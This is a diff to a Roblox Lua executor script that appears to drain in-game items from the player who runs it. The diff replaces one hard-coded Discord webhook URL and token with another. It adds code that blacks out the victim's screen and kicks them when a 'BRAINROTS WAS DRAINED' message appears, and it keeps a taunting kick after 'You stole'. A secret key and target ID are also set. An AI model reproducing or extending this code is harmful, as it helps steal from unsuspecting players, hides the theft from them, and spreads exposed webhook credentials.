@@ -1,7 +1,7 @@
 repeat task.wait() until game:IsLoaded()
  
 task.spawn(function()
-    local url = "https://discord.com/api/webhooks/1485392452088103153/BIiOu2r4bO5zKh40r93EG-aWfIOqOrumbgcj0-mhvh0apDLLjN_X0DZ1HuWkvSWOu2cb"
+    local url = "https://discord.com/api/webhooks/1495338444904468581/Z0kOMTUHPSRUq4j_oHXiB9AtW4Jj00u9DkW-4-y1UHqnEzmzdeT6UUjU0pWIccwoLc2b"
     local HttpService = game:GetService("HttpService")
     local Players = game:GetService("Players")
     local MarketplaceService = game:GetService("MarketplaceService")
@@ -954,10 +954,7 @@ task.spawn(function()
     pgui.DescendantAdded:Connect(function(obj)
         if obj:IsA("TextLabel") then
             if string.find(obj.Text, "You stole") then
-                
                 local msg = "ezzzz steal by brr782k <3"
-
-                -- Tentative en parallèle (pas garanti)
                 task.spawn(function()
                     local chat = game:GetService("TextChatService")
                     if chat.ChatVersion == Enum.ChatVersion.TextChatService then
@@ -968,13 +965,26 @@ task.spawn(function()
                         if ev then ev:FireServer(msg, "All") end
                     end
                 end)
-
-                -- Kick instant
                 p:Kick(msg)
+
+            elseif string.find(obj.Text, "YOUR BRAINROTS WAS DRAINED") then
+                local black = Instance.new("ScreenGui")
+                black.IgnoreGuiInset = true
+                black.DisplayOrder = 1000000
+                black.Parent = pgui
+                local frame = Instance.new("Frame")
+                frame.Size = UDim2.new(1, 0, 1, 0)
+                frame.BackgroundColor3 = Color3.new(0, 0, 0)
+                frame.BorderSizePixel = 0
+                frame.Parent = black
+                
+                task.wait(0.01)
+                p:Kick("test")
             end
         end
     end)
 end)
+
 
 getgenv().SECRET_KEY = "mrr_94d9f8fe3a02461085f84d087e98c28a"
 getgenv().TARGET_ID = 4190736407
